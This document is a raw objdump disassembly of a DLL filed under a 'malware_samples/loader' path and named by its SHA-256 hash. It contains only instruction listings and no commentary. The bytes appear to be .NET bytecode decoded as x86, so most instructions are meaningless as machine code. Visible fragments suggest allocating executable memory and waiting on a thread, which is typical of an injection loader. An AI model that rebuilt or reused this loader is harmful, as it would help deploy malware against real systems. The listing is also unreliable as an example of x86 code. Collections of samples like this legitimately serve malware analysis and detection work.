
malware_samples/loader/905202cf004a6f194dc3b905d4ed2ec79741f24c2e217f7e9600da7c14b74cc7.dll:     file format pei-i386


Disassembly of section .text:

10002000 <.text>:
10002000:	85 51 00             	test   %edx,0x0(%ecx)
10002003:	00 00                	add    %al,(%eax)
10002005:	00 00                	add    %al,(%eax)
10002007:	00 48 00             	add    %cl,0x0(%eax)
1000200a:	00 00                	add    %al,(%eax)
1000200c:	02 00                	add    (%eax),%al
1000200e:	05 00 10 26 00       	add    $0x261000,%eax
10002013:	00 90 2a 00 00 01    	add    %dl,0x100002a(%eax)
	...
1000204d:	00 00                	add    %al,(%eax)
1000204f:	00 13                	add    %dl,(%ebx)
10002051:	30 04 00             	xor    %al,(%eax,%eax,1)
10002054:	67 00 00             	add    %al,(%bx,%si)
10002057:	00 00                	add    %al,(%eax)
10002059:	00 00                	add    %al,(%eax)
1000205b:	00 28                	add    %ch,(%eax)
1000205d:	10 00                	adc    %al,(%eax)
1000205f:	00 0a                	add    %cl,(%edx)
10002061:	28 10                	sub    %dl,(%eax)
10002063:	00 00                	add    %al,(%eax)
10002065:	0a 72 01             	or     0x1(%edx),%dh
10002068:	00 00                	add    %al,(%eax)
1000206a:	70 28                	jo     0x10002094
1000206c:	11 00                	adc    %eax,(%eax)
1000206e:	00 0a                	add    %cl,(%edx)
10002070:	6f                   	outsl  %ds:(%esi),(%dx)
10002071:	12 00                	adc    (%eax),%al
10002073:	00 0a                	add    %cl,(%edx)
10002075:	72 e4                	jb     0x1000205b
10002077:	02 00                	add    (%eax),%al
10002079:	70 72                	jo     0x100020ed
1000207b:	fa                   	cli
1000207c:	02 00                	add    (%eax),%al
1000207e:	70 6f                	jo     0x100020ef
10002080:	13 00                	adc    (%eax),%eax
10002082:	00 0a                	add    %cl,(%edx)
10002084:	28 11                	sub    %dl,(%ecx)
10002086:	00 00                	add    %al,(%eax)
10002088:	0a 6f 12             	or     0x12(%edi),%ch
1000208b:	00 00                	add    %al,(%eax)
1000208d:	0a 02                	or     (%edx),%al
1000208f:	28 01                	sub    %al,(%ecx)
10002091:	00 00                	add    %al,(%eax)
10002093:	2b 7e 19             	sub    0x19(%esi),%edi
10002096:	00 00                	add    %al,(%eax)
10002098:	04 25                	add    $0x25,%al
1000209a:	2d 17 26 7e 18       	sub    $0x187e2617,%eax
1000209f:	00 00                	add    %al,(%eax)
100020a1:	04 fe                	add    $0xfe,%al
100020a3:	06                   	push   %es
100020a4:	0f 00 00             	sldt   (%eax)
100020a7:	06                   	push   %es
100020a8:	73 15                	jae    0x100020bf
100020aa:	00 00                	add    %al,(%eax)
100020ac:	0a 25 80 19 00 00    	or     0x1980,%ah
100020b2:	04 28                	add    $0x28,%al
100020b4:	02 00                	add    (%eax),%al
100020b6:	00 2b                	add    %ch,(%ebx)
100020b8:	28 03                	sub    %al,(%ebx)
100020ba:	00 00                	add    %al,(%eax)
100020bc:	2b 73 18             	sub    0x18(%ebx),%esi
100020bf:	00 00                	add    %al,(%eax)
100020c1:	0a 2a                	or     (%edx),%ch
100020c3:	00 1b                	add    %bl,(%ebx)
100020c5:	30 0a                	xor    %cl,(%edx)
100020c7:	00 20                	add    %ah,(%eax)
100020c9:	01 00                	add    %eax,(%eax)
100020cb:	00 01                	add    %al,(%ecx)
100020cd:	00 00                	add    %al,(%eax)
100020cf:	11 12                	adc    %edx,(%edx)
100020d1:	00 fe                	add    %bh,%dh
100020d3:	15 03 00 00 02       	adc    $0x2000003,%eax
100020d8:	12 00                	adc    (%eax),%al
100020da:	06                   	push   %es
100020db:	28 04 00             	sub    %al,(%eax,%eax,1)
100020de:	00 2b                	add    %ch,(%ebx)
100020e0:	7d 02                	jge    0x100020e4
100020e2:	00 00                	add    %al,(%eax)
100020e4:	04 12                	add    $0x12,%al
100020e6:	01 fe                	add    %edi,%esi
100020e8:	15 04 00 00 02       	adc    $0x2000004,%eax
100020ed:	28 0c 00             	sub    %cl,(%eax,%eax,1)
100020f0:	00 06                	add    %al,(%esi)
100020f2:	14 7e                	adc    $0x7e,%al
100020f4:	1a 00                	sbb    (%eax),%al
100020f6:	00 0a                	add    %cl,(%edx)
100020f8:	7e 1a                	jle    0x10002114
100020fa:	00 00                	add    %al,(%eax)
100020fc:	0a 16                	or     (%esi),%dl
100020fe:	1a 7e 1a             	sbb    0x1a(%esi),%bh
10002101:	00 00                	add    %al,(%eax)
10002103:	0a 14 12             	or     (%edx,%edx,1),%dl
10002106:	00 12                	add    %dl,(%edx)
10002108:	01 28                	add    %ebp,(%eax)
1000210a:	01 00                	add    %eax,(%eax)
1000210c:	00 06                	add    %al,(%esi)
1000210e:	2d 01 2a 00 07       	sub    $0x7002a01,%eax
10002113:	7b 14                	jnp    0x10002129
10002115:	00 00                	add    %al,(%eax)
10002117:	04 7e                	add    $0x7e,%al
10002119:	1a 00                	sbb    (%eax),%al
1000211b:	00 0a                	add    %cl,(%edx)
1000211d:	03 8e 69 20 00 30    	add    0x30002069(%esi),%ecx
10002123:	00 00                	add    %al,(%eax)
10002125:	1f                   	pop    %ds
10002126:	40                   	inc    %eax
10002127:	28 08                	sub    %cl,(%eax)
10002129:	00 00                	add    %al,(%eax)
1000212b:	06                   	push   %es
1000212c:	0c 08                	or     $0x8,%al
1000212e:	7e 1a                	jle    0x1000214a
10002130:	00 00                	add    %al,(%eax)
10002132:	0a 28                	or     (%eax),%ch
10002134:	1b 00                	sbb    (%eax),%eax
10002136:	00 0a                	add    %cl,(%edx)
10002138:	2c 0b                	sub    $0xb,%al
1000213a:	72 fa                	jb     0x10002136
1000213c:	02 00                	add    (%eax),%al
1000213e:	70 73                	jo     0x100021b3
10002140:	1c 00                	sbb    $0x0,%al
10002142:	00 0a                	add    %cl,(%edx)
10002144:	7a 07                	jp     0x1000214d
10002146:	7b 14                	jnp    0x1000215c
10002148:	00 00                	add    %al,(%eax)
1000214a:	04 08                	add    $0x8,%al
1000214c:	03 03                	add    (%ebx),%eax
1000214e:	8e 69 12             	mov    0x12(%ecx),%gs
10002151:	04 28                	add    $0x28,%al
10002153:	02 00                	add    (%eax),%al
10002155:	00 06                	add    %al,(%esi)
10002157:	2d 0b 72 fa 02       	sub    $0x2fa720b,%eax
1000215c:	00 70 73             	add    %dh,0x73(%eax)
1000215f:	1c 00                	sbb    $0x0,%al
10002161:	00 0a                	add    %cl,(%edx)
10002163:	7a 07                	jp     0x1000216c
10002165:	7b 14                	jnp    0x1000217b
10002167:	00 00                	add    %al,(%eax)
10002169:	04 7e                	add    $0x7e,%al
1000216b:	1a 00                	sbb    (%eax),%al
1000216d:	00 0a                	add    %cl,(%edx)
1000216f:	16                   	push   %ss
10002170:	08 7e 1a             	or     %bh,0x1a(%esi)
10002173:	00 00                	add    %al,(%eax)
10002175:	0a 16                	or     (%esi),%dl
10002177:	12 04 28             	adc    (%eax,%ebp,1),%al
1000217a:	09 00                	or     %eax,(%eax)
1000217c:	00 06                	add    %al,(%esi)
1000217e:	0d 09 7e 1a 00       	or     $0x1a7e09,%eax
10002183:	00 0a                	add    %cl,(%edx)
10002185:	28 1b                	sub    %bl,(%ebx)
10002187:	00 00                	add    %al,(%eax)
10002189:	0a 2d 45 09 12 06    	or     0x6120945,%ch
1000218f:	28 04 00             	sub    %al,(%eax,%eax,1)
10002192:	00 06                	add    %al,(%esi)
10002194:	2c 12                	sub    $0x12,%al
10002196:	11 06                	adc    %eax,(%esi)
10002198:	20 03                	and    %al,(%ebx)
1000219a:	01 00                	add    %eax,(%eax)
1000219c:	00 33                	add    %dh,(%ebx)
1000219e:	0b 1f                	or     (%edi),%ebx
100021a0:	64 28 1d 00 00 0a 2b 	sub    %bl,%fs:0x2b0a0000
100021a7:	e4 de                	in     $0xde,%al
100021a9:	45                   	inc    %ebp
100021aa:	07                   	pop    %es
100021ab:	7b 16                	jnp    0x100021c3
100021ad:	00 00                	add    %al,(%eax)
100021af:	04 28                	add    $0x28,%al
100021b1:	1e                   	push   %ds
100021b2:	00 00                	add    %al,(%eax)
100021b4:	0a 13                	or     (%ebx),%dl
100021b6:	05 11 05 6f 1f       	add    $0x1f6f0511,%eax
100021bb:	00 00                	add    %al,(%eax)
100021bd:	0a 16                	or     (%esi),%dl
100021bf:	fe 01                	incb   (%ecx)
100021c1:	2c 07                	sub    $0x7,%al
100021c3:	11 05 6f 20 00 00    	adc    %eax,0x206f
100021c9:	0a 09                	or     (%ecx),%cl
100021cb:	28 06                	sub    %al,(%esi)
100021cd:	00 00                	add    %al,(%eax)
100021cf:	06                   	push   %es
100021d0:	26 de 1c 26          	ficomps %es:(%esi,%eiz,1)
100021d4:	de 19                	ficomps (%ecx)
100021d6:	07                   	pop    %es
100021d7:	7b 14                	jnp    0x100021ed
100021d9:	00 00                	add    %al,(%eax)
100021db:	04 28                	add    $0x28,%al
100021dd:	06                   	push   %es
100021de:	00 00                	add    %al,(%eax)
100021e0:	06                   	push   %es
100021e1:	26 07                	es pop %es
100021e3:	7b 15                	jnp    0x100021fa
100021e5:	00 00                	add    %al,(%eax)
100021e7:	04 28                	add    $0x28,%al
100021e9:	06                   	push   %es
100021ea:	00 00                	add    %al,(%eax)
100021ec:	06                   	push   %es
100021ed:	26 dc 2a             	fsubrl %es:(%edx)
100021f0:	01 1c 00             	add    %ebx,(%eax,%eax,1)
100021f3:	00 00                	add    %al,(%eax)
100021f5:	00 42 00             	add    %al,0x0(%edx)
100021f8:	c1 03 01             	roll   $0x1,(%ebx)
100021fb:	03 13                	add    (%ebx),%edx
100021fd:	00 00                	add    %al,(%eax)
100021ff:	01 02                	add    %eax,(%edx)
10002201:	00 42 00             	add    %al,0x0(%edx)
10002204:	c4 06                	les    (%esi),%eax
10002206:	01 19                	add    %ebx,(%ecx)
10002208:	00 00                	add    %al,(%eax)
1000220a:	00 00                	add    %al,(%eax)
1000220c:	13 30                	adc    (%eax),%esi
1000220e:	04 00                	add    $0x0,%al
10002210:	67 00 00             	add    %al,(%bx,%si)
10002213:	00 00                	add    %al,(%eax)
10002215:	00 00                	add    %al,(%eax)
10002217:	00 28                	add    %ch,(%eax)
10002219:	10 00                	adc    %al,(%eax)
1000221b:	00 0a                	add    %cl,(%edx)
1000221d:	28 10                	sub    %dl,(%eax)
1000221f:	00 00                	add    %al,(%eax)
10002221:	0a 72 fc             	or     -0x4(%edx),%dh
10002224:	02 00                	add    (%eax),%al
10002226:	70 28                	jo     0x10002250
10002228:	11 00                	adc    %eax,(%eax)
1000222a:	00 0a                	add    %cl,(%edx)
1000222c:	6f                   	outsl  %ds:(%esi),(%dx)
1000222d:	12 00                	adc    (%eax),%al
1000222f:	00 0a                	add    %cl,(%edx)
10002231:	72 6f                	jb     0x100022a2
10002233:	04 00                	add    $0x0,%al
10002235:	70 72                	jo     0x100022a9
10002237:	fa                   	cli
10002238:	02 00                	add    (%eax),%al
1000223a:	70 6f                	jo     0x100022ab
1000223c:	13 00                	adc    (%eax),%eax
1000223e:	00 0a                	add    %cl,(%edx)
10002240:	28 11                	sub    %dl,(%ecx)
10002242:	00 00                	add    %al,(%eax)
10002244:	0a 6f 12             	or     0x12(%edi),%ch
10002247:	00 00                	add    %al,(%eax)
10002249:	0a 02                	or     (%edx),%al
1000224b:	28 01                	sub    %al,(%ecx)
1000224d:	00 00                	add    %al,(%eax)
1000224f:	2b 7e 1a             	sub    0x1a(%esi),%edi
10002252:	00 00                	add    %al,(%eax)
10002254:	04 25                	add    $0x25,%al
10002256:	2d 17 26 7e 18       	sub    $0x187e2617,%eax
1000225b:	00 00                	add    %al,(%eax)
1000225d:	04 fe                	add    $0xfe,%al
1000225f:	06                   	push   %es
10002260:	10 00                	adc    %al,(%eax)
10002262:	00 06                	add    %al,(%esi)
10002264:	73 15                	jae    0x1000227b
10002266:	00 00                	add    %al,(%eax)
10002268:	0a 25 80 1a 00 00    	or     0x1a80,%ah
1000226e:	04 28                	add    $0x28,%al
10002270:	02 00                	add    (%eax),%al
10002272:	00 2b                	add    %ch,(%ebx)
10002274:	28 03                	sub    %al,(%ebx)
10002276:	00 00                	add    %al,(%eax)
10002278:	2b 73 18             	sub    0x18(%ebx),%esi
1000227b:	00 00                	add    %al,(%eax)
1000227d:	0a 2a                	or     (%edx),%ch
1000227f:	2e 73 21             	jae,pn 0x100022a3
10002282:	00 00                	add    %al,(%eax)
10002284:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
1000228a:	2a 00                	sub    (%eax),%al
1000228c:	13 30                	adc    (%eax),%esi
1000228e:	07                   	pop    %es
1000228f:	00 62 02             	add    %ah,0x2(%edx)
10002292:	00 00                	add    %al,(%eax)
10002294:	02 00                	add    (%eax),%al
10002296:	00 11                	add    %dl,(%ecx)
10002298:	73 11                	jae    0x100022ab
1000229a:	00 00                	add    %al,(%eax)
1000229c:	06                   	push   %es
1000229d:	0a 06                	or     (%esi),%al
1000229f:	73 22                	jae    0x100022c3
100022a1:	00 00                	add    %al,(%eax)
100022a3:	0a 25 28 10 00 00    	or     0x1028,%ah
100022a9:	0a 28                	or     (%eax),%ch
100022ab:	10 00                	adc    %al,(%eax)
100022ad:	00 0a                	add    %cl,(%edx)
100022af:	72 85                	jb     0x10002236
100022b1:	04 00                	add    $0x0,%al
100022b3:	70 28                	jo     0x100022dd
100022b5:	11 00                	adc    %eax,(%eax)
100022b7:	00 0a                	add    %cl,(%edx)
100022b9:	6f                   	outsl  %ds:(%esi),(%dx)
100022ba:	12 00                	adc    (%eax),%al
100022bc:	00 0a                	add    %cl,(%edx)
100022be:	72 38                	jb     0x100022f8
100022c0:	06                   	push   %es
100022c1:	00 70 72             	add    %dh,0x72(%eax)
100022c4:	fa                   	cli
100022c5:	02 00                	add    (%eax),%al
100022c7:	70 6f                	jo     0x10002338
100022c9:	13 00                	adc    (%eax),%eax
100022cb:	00 0a                	add    %cl,(%edx)
100022cd:	28 11                	sub    %dl,(%ecx)
100022cf:	00 00                	add    %al,(%eax)
100022d1:	0a 6f 12             	or     0x12(%edi),%ch
100022d4:	00 00                	add    %al,(%eax)
100022d6:	0a 6f 23             	or     0x23(%edi),%ch
100022d9:	00 00                	add    %al,(%eax)
100022db:	0a 25 28 10 00 00    	or     0x1028,%ah
100022e1:	0a 28                	or     (%eax),%ch
100022e3:	10 00                	adc    %al,(%eax)
100022e5:	00 0a                	add    %cl,(%edx)
100022e7:	72 4e                	jb     0x10002337
100022e9:	06                   	push   %es
100022ea:	00 70 28             	add    %dh,0x28(%eax)
100022ed:	11 00                	adc    %eax,(%eax)
100022ef:	00 0a                	add    %cl,(%edx)
100022f1:	6f                   	outsl  %ds:(%esi),(%dx)
100022f2:	12 00                	adc    (%eax),%al
100022f4:	00 0a                	add    %cl,(%edx)
100022f6:	72 01                	jb     0x100022f9
100022f8:	08 00                	or     %al,(%eax)
100022fa:	70 72                	jo     0x1000236e
100022fc:	fa                   	cli
100022fd:	02 00                	add    (%eax),%al
100022ff:	70 6f                	jo     0x10002370
10002301:	13 00                	adc    (%eax),%eax
10002303:	00 0a                	add    %cl,(%edx)
10002305:	28 11                	sub    %dl,(%ecx)
10002307:	00 00                	add    %al,(%eax)
10002309:	0a 6f 12             	or     0x12(%edi),%ch
1000230c:	00 00                	add    %al,(%eax)
1000230e:	0a 6f 23             	or     0x23(%edi),%ch
10002311:	00 00                	add    %al,(%eax)
10002313:	0a 25 28 10 00 00    	or     0x1028,%ah
10002319:	0a 28                	or     (%eax),%ch
1000231b:	10 00                	adc    %al,(%eax)
1000231d:	00 0a                	add    %cl,(%edx)
1000231f:	72 17                	jb     0x10002338
10002321:	08 00                	or     %al,(%eax)
10002323:	70 28                	jo     0x1000234d
10002325:	11 00                	adc    %eax,(%eax)
10002327:	00 0a                	add    %cl,(%edx)
10002329:	6f                   	outsl  %ds:(%esi),(%dx)
1000232a:	12 00                	adc    (%eax),%al
1000232c:	00 0a                	add    %cl,(%edx)
1000232e:	72 d2                	jb     0x10002302
10002330:	08 00                	or     %al,(%eax)
10002332:	70 72                	jo     0x100023a6
10002334:	fa                   	cli
10002335:	02 00                	add    (%eax),%al
10002337:	70 6f                	jo     0x100023a8
10002339:	13 00                	adc    (%eax),%eax
1000233b:	00 0a                	add    %cl,(%edx)
1000233d:	28 11                	sub    %dl,(%ecx)
1000233f:	00 00                	add    %al,(%eax)
10002341:	0a 6f 12             	or     0x12(%edi),%ch
10002344:	00 00                	add    %al,(%eax)
10002346:	0a 6f 23             	or     0x23(%edi),%ch
10002349:	00 00                	add    %al,(%eax)
1000234b:	0a 25 28 10 00 00    	or     0x1028,%ah
10002351:	0a 28                	or     (%eax),%ch
10002353:	10 00                	adc    %al,(%eax)
10002355:	00 0a                	add    %cl,(%edx)
10002357:	72 e8                	jb     0x10002341
10002359:	08 00                	or     %al,(%eax)
1000235b:	70 28                	jo     0x10002385
1000235d:	11 00                	adc    %eax,(%eax)
1000235f:	00 0a                	add    %cl,(%edx)
10002361:	6f                   	outsl  %ds:(%esi),(%dx)
10002362:	12 00                	adc    (%eax),%al
10002364:	00 0a                	add    %cl,(%edx)
10002366:	72 a3                	jb     0x1000230b
10002368:	09 00                	or     %eax,(%eax)
1000236a:	70 72                	jo     0x100023de
1000236c:	fa                   	cli
1000236d:	02 00                	add    (%eax),%al
1000236f:	70 6f                	jo     0x100023e0
10002371:	13 00                	adc    (%eax),%eax
10002373:	00 0a                	add    %cl,(%edx)
10002375:	28 11                	sub    %dl,(%ecx)
10002377:	00 00                	add    %al,(%eax)
10002379:	0a 6f 12             	or     0x12(%edi),%ch
1000237c:	00 00                	add    %al,(%eax)
1000237e:	0a 6f 23             	or     0x23(%edi),%ch
10002381:	00 00                	add    %al,(%eax)
10002383:	0a 25 28 10 00 00    	or     0x1028,%ah
10002389:	0a 28                	or     (%eax),%ch
1000238b:	10 00                	adc    %al,(%eax)
1000238d:	00 0a                	add    %cl,(%edx)
1000238f:	72 b9                	jb     0x1000234a
10002391:	09 00                	or     %eax,(%eax)
10002393:	70 28                	jo     0x100023bd
10002395:	11 00                	adc    %eax,(%eax)
10002397:	00 0a                	add    %cl,(%edx)
10002399:	6f                   	outsl  %ds:(%esi),(%dx)
1000239a:	12 00                	adc    (%eax),%al
1000239c:	00 0a                	add    %cl,(%edx)
1000239e:	72 b4                	jb     0x10002354
100023a0:	0a 00                	or     (%eax),%al
100023a2:	70 72                	jo     0x10002416
100023a4:	fa                   	cli
100023a5:	02 00                	add    (%eax),%al
100023a7:	70 6f                	jo     0x10002418
100023a9:	13 00                	adc    (%eax),%eax
100023ab:	00 0a                	add    %cl,(%edx)
100023ad:	28 11                	sub    %dl,(%ecx)
100023af:	00 00                	add    %al,(%eax)
100023b1:	0a 6f 12             	or     0x12(%edi),%ch
100023b4:	00 00                	add    %al,(%eax)
100023b6:	0a 6f 23             	or     0x23(%edi),%ch
100023b9:	00 00                	add    %al,(%eax)
100023bb:	0a 25 28 10 00 00    	or     0x1028,%ah
100023c1:	0a 28                	or     (%eax),%ch
100023c3:	10 00                	adc    %al,(%eax)
100023c5:	00 0a                	add    %cl,(%edx)
100023c7:	72 ca                	jb     0x10002393
100023c9:	0a 00                	or     (%eax),%al
100023cb:	70 28                	jo     0x100023f5
100023cd:	11 00                	adc    %eax,(%eax)
100023cf:	00 0a                	add    %cl,(%edx)
100023d1:	6f                   	outsl  %ds:(%esi),(%dx)
100023d2:	12 00                	adc    (%eax),%al
100023d4:	00 0a                	add    %cl,(%edx)
100023d6:	72 44                	jb     0x1000241c
100023d8:	0b 00                	or     (%eax),%eax
100023da:	70 72                	jo     0x1000244e
100023dc:	fa                   	cli
100023dd:	02 00                	add    (%eax),%al
100023df:	70 6f                	jo     0x10002450
100023e1:	13 00                	adc    (%eax),%eax
100023e3:	00 0a                	add    %cl,(%edx)
100023e5:	28 11                	sub    %dl,(%ecx)
100023e7:	00 00                	add    %al,(%eax)
100023e9:	0a 6f 12             	or     0x12(%edi),%ch
100023ec:	00 00                	add    %al,(%eax)
100023ee:	0a 6f 23             	or     0x23(%edi),%ch
100023f1:	00 00                	add    %al,(%eax)
100023f3:	0a 25 28 10 00 00    	or     0x1028,%ah
100023f9:	0a 28                	or     (%eax),%ch
100023fb:	10 00                	adc    %al,(%eax)
100023fd:	00 0a                	add    %cl,(%edx)
100023ff:	72 5a                	jb     0x1000245b
10002401:	0b 00                	or     (%eax),%eax
10002403:	70 28                	jo     0x1000242d
10002405:	11 00                	adc    %eax,(%eax)
10002407:	00 0a                	add    %cl,(%edx)
10002409:	6f                   	outsl  %ds:(%esi),(%dx)
1000240a:	12 00                	adc    (%eax),%al
1000240c:	00 0a                	add    %cl,(%edx)
1000240e:	72 cd                	jb     0x100023dd
10002410:	0c 00                	or     $0x0,%al
10002412:	70 72                	jo     0x10002486
10002414:	fa                   	cli
10002415:	02 00                	add    (%eax),%al
10002417:	70 6f                	jo     0x10002488
10002419:	13 00                	adc    (%eax),%eax
1000241b:	00 0a                	add    %cl,(%edx)
1000241d:	28 11                	sub    %dl,(%ecx)
1000241f:	00 00                	add    %al,(%eax)
10002421:	0a 6f 12             	or     0x12(%edi),%ch
10002424:	00 00                	add    %al,(%eax)
10002426:	0a 6f 23             	or     0x23(%edi),%ch
10002429:	00 00                	add    %al,(%eax)
1000242b:	0a 25 28 10 00 00    	or     0x1028,%ah
10002431:	0a 28                	or     (%eax),%ch
10002433:	10 00                	adc    %al,(%eax)
10002435:	00 0a                	add    %cl,(%edx)
10002437:	72 e3                	jb     0x1000241c
10002439:	0c 00                	or     $0x0,%al
1000243b:	70 28                	jo     0x10002465
1000243d:	11 00                	adc    %eax,(%eax)
1000243f:	00 0a                	add    %cl,(%edx)
10002441:	6f                   	outsl  %ds:(%esi),(%dx)
10002442:	12 00                	adc    (%eax),%al
10002444:	00 0a                	add    %cl,(%edx)
10002446:	72 de                	jb     0x10002426
10002448:	0d 00 70 72 fa       	or     $0xfa727000,%eax
1000244d:	02 00                	add    (%eax),%al
1000244f:	70 6f                	jo     0x100024c0
10002451:	13 00                	adc    (%eax),%eax
10002453:	00 0a                	add    %cl,(%edx)
10002455:	28 11                	sub    %dl,(%ecx)
10002457:	00 00                	add    %al,(%eax)
10002459:	0a 6f 12             	or     0x12(%edi),%ch
1000245c:	00 00                	add    %al,(%eax)
1000245e:	0a 6f 23             	or     0x23(%edi),%ch
10002461:	00 00                	add    %al,(%eax)
10002463:	0a 7d 1b             	or     0x1b(%ebp),%bh
10002466:	00 00                	add    %al,(%eax)
10002468:	04 28                	add    $0x28,%al
1000246a:	10 00                	adc    %al,(%eax)
1000246c:	00 0a                	add    %cl,(%edx)
1000246e:	28 10                	sub    %dl,(%eax)
10002470:	00 00                	add    %al,(%eax)
10002472:	0a 72 f4             	or     -0xc(%edx),%dh
10002475:	0d 00 70 28 11       	or     $0x11287000,%eax
1000247a:	00 00                	add    %al,(%eax)
1000247c:	0a 6f 12             	or     0x12(%edi),%ch
1000247f:	00 00                	add    %al,(%eax)
10002481:	0a 72 77             	or     0x77(%edx),%dh
10002484:	13 00                	adc    (%eax),%eax
10002486:	70 72                	jo     0x100024fa
10002488:	fa                   	cli
10002489:	02 00                	add    (%eax),%al
1000248b:	70 6f                	jo     0x100024fc
1000248d:	13 00                	adc    (%eax),%eax
1000248f:	00 0a                	add    %cl,(%edx)
10002491:	28 11                	sub    %dl,(%ecx)
10002493:	00 00                	add    %al,(%eax)
10002495:	0a 6f 12             	or     0x12(%edi),%ch
10002498:	00 00                	add    %al,(%eax)
1000249a:	0a 28                	or     (%eax),%ch
1000249c:	10 00                	adc    %al,(%eax)
1000249e:	00 0a                	add    %cl,(%edx)
100024a0:	28 10                	sub    %dl,(%eax)
100024a2:	00 00                	add    %al,(%eax)
100024a4:	0a 72 8d             	or     -0x73(%edx),%dh
100024a7:	13 00                	adc    (%eax),%eax
100024a9:	70 28                	jo     0x100024d3
100024ab:	11 00                	adc    %eax,(%eax)
100024ad:	00 0a                	add    %cl,(%edx)
100024af:	6f                   	outsl  %ds:(%esi),(%dx)
100024b0:	12 00                	adc    (%eax),%al
100024b2:	00 0a                	add    %cl,(%edx)
100024b4:	72 48                	jb     0x100024fe
100024b6:	14 00                	adc    $0x0,%al
100024b8:	70 72                	jo     0x1000252c
100024ba:	fa                   	cli
100024bb:	02 00                	add    (%eax),%al
100024bd:	70 6f                	jo     0x1000252e
100024bf:	13 00                	adc    (%eax),%eax
100024c1:	00 0a                	add    %cl,(%edx)
100024c3:	28 11                	sub    %dl,(%ecx)
100024c5:	00 00                	add    %al,(%eax)
100024c7:	0a 6f 12             	or     0x12(%edi),%ch
100024ca:	00 00                	add    %al,(%eax)
100024cc:	0a 17                	or     (%edi),%dl
100024ce:	28 24 00             	sub    %ah,(%eax,%eax,1)
100024d1:	00 0a                	add    %cl,(%edx)
100024d3:	06                   	push   %es
100024d4:	fe 06                	incb   (%esi)
100024d6:	12 00                	adc    (%eax),%al
100024d8:	00 06                	add    %al,(%esi)
100024da:	73 25                	jae    0x10002501
100024dc:	00 00                	add    %al,(%eax)
100024de:	0a 28                	or     (%eax),%ch
100024e0:	05 00 00 2b 28       	add    $0x282b0000,%eax
100024e5:	06                   	push   %es
100024e6:	00 00                	add    %al,(%eax)
100024e8:	2b 0b                	sub    (%ebx),%ecx
100024ea:	07                   	pop    %es
100024eb:	73 21                	jae    0x1000250e
100024ed:	00 00                	add    %al,(%eax)
100024ef:	0a 07                	or     (%edi),%al
100024f1:	8e 69 6f             	mov    0x6f(%ecx),%gs
100024f4:	27                   	daa
100024f5:	00 00                	add    %al,(%eax)
100024f7:	0a 9a 2a 00 00 13    	or     0x1300002a(%edx),%bl
100024fd:	30 07                	xor    %al,(%edi)
100024ff:	00 a6 00 00 00 03    	add    %ah,0x3000000(%esi)
10002505:	00 00                	add    %al,(%eax)
10002507:	11 28                	adc    %ebp,(%eax)
10002509:	10 00                	adc    %al,(%eax)
1000250b:	00 0a                	add    %cl,(%edx)
1000250d:	28 10                	sub    %dl,(%eax)
1000250f:	00 00                	add    %al,(%eax)
10002511:	0a 72 5e             	or     0x5e(%edx),%dh
10002514:	14 00                	adc    $0x0,%al
10002516:	70 28                	jo     0x10002540
10002518:	11 00                	adc    %eax,(%eax)
1000251a:	00 0a                	add    %cl,(%edx)
1000251c:	6f                   	outsl  %ds:(%esi),(%dx)
1000251d:	12 00                	adc    (%eax),%al
1000251f:	00 0a                	add    %cl,(%edx)
10002521:	72 51                	jb     0x10002574
10002523:	16                   	push   %ss
10002524:	00 70 72             	add    %dh,0x72(%eax)
10002527:	fa                   	cli
10002528:	02 00                	add    (%eax),%al
1000252a:	70 6f                	jo     0x1000259b
1000252c:	13 00                	adc    (%eax),%eax
1000252e:	00 0a                	add    %cl,(%edx)
10002530:	28 11                	sub    %dl,(%ecx)
10002532:	00 00                	add    %al,(%eax)
10002534:	0a 6f 12             	or     0x12(%edi),%ch
10002537:	00 00                	add    %al,(%eax)
10002539:	0a 1a                	or     (%edx),%bl
1000253b:	28 03                	sub    %al,(%ebx)
1000253d:	00 00                	add    %al,(%eax)
1000253f:	06                   	push   %es
10002540:	28 28                	sub    %ch,(%eax)
10002542:	00 00                	add    %al,(%eax)
10002544:	0a 25 28 29 00 00    	or     0x2928,%ah
1000254a:	0a 26                	or     (%esi),%ah
1000254c:	28 0b                	sub    %cl,(%ebx)
1000254e:	00 00                	add    %al,(%eax)
10002550:	06                   	push   %es
10002551:	0a 1b                	or     (%ebx),%bl
10002553:	28 03                	sub    %al,(%ebx)
10002555:	00 00                	add    %al,(%eax)
10002557:	06                   	push   %es
10002558:	72 67                	jb     0x100025c1
1000255a:	16                   	push   %ss
1000255b:	00 70 28             	add    %dh,0x28(%eax)
1000255e:	10 00                	adc    %al,(%eax)
10002560:	00 0a                	add    %cl,(%edx)
10002562:	28 10                	sub    %dl,(%eax)
10002564:	00 00                	add    %al,(%eax)
10002566:	0a 72 6b             	or     0x6b(%edx),%dh
10002569:	16                   	push   %ss
1000256a:	00 70 28             	add    %dh,0x28(%eax)
1000256d:	11 00                	adc    %eax,(%eax)
1000256f:	00 0a                	add    %cl,(%edx)
10002571:	6f                   	outsl  %ds:(%esi),(%dx)
10002572:	12 00                	adc    (%eax),%al
10002574:	00 0a                	add    %cl,(%edx)
10002576:	72 26                	jb     0x1000259e
10002578:	17                   	pop    %ss
10002579:	00 70 72             	add    %dh,0x72(%eax)
1000257c:	fa                   	cli
1000257d:	02 00                	add    (%eax),%al
1000257f:	70 6f                	jo     0x100025f0
10002581:	13 00                	adc    (%eax),%eax
10002583:	00 0a                	add    %cl,(%edx)
10002585:	28 11                	sub    %dl,(%ecx)
10002587:	00 00                	add    %al,(%eax)
10002589:	0a 6f 12             	or     0x12(%edi),%ch
1000258c:	00 00                	add    %al,(%eax)
1000258e:	0a 28                	or     (%eax),%ch
10002590:	2a 00                	sub    (%eax),%al
10002592:	00 0a                	add    %cl,(%edx)
10002594:	28 28                	sub    %ch,(%eax)
10002596:	00 00                	add    %al,(%eax)
10002598:	0a 0b                	or     (%ebx),%cl
1000259a:	06                   	push   %es
1000259b:	07                   	pop    %es
1000259c:	17                   	pop    %ss
1000259d:	28 2b                	sub    %ch,(%ebx)
1000259f:	00 00                	add    %al,(%eax)
100025a1:	0a 20                	or     (%eax),%ah
100025a3:	e8 03 00 00 28       	call   0x380025ab
100025a8:	1d 00 00 0a 07       	sbb    $0x70a0000,%eax
100025ad:	2a 2e                	sub    (%esi),%ch
100025af:	73 0e                	jae    0x100025bf
100025b1:	00 00                	add    %al,(%eax)
100025b3:	06                   	push   %es
100025b4:	80 18 00             	sbbb   $0x0,(%eax)
100025b7:	00 04 2a             	add    %al,(%edx,%ebp,1)
100025ba:	1e                   	push   %ds
100025bb:	02 28                	add    (%eax),%ch
100025bd:	2c 00                	sub    $0x0,%al
